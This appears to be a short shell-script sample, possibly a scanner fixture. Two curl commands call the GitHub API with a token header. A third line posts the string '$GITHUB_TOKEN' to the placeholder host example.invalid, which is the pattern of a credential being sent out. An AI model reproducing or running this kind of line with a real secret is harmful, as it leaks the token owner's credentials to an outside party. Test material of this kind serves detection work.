#!/bin/sh
curl --retry-delay 5 -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/example/project
curl --data "{}" -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/example/project
curl --data '$GITHUB_TOKEN' https://example.invalid/
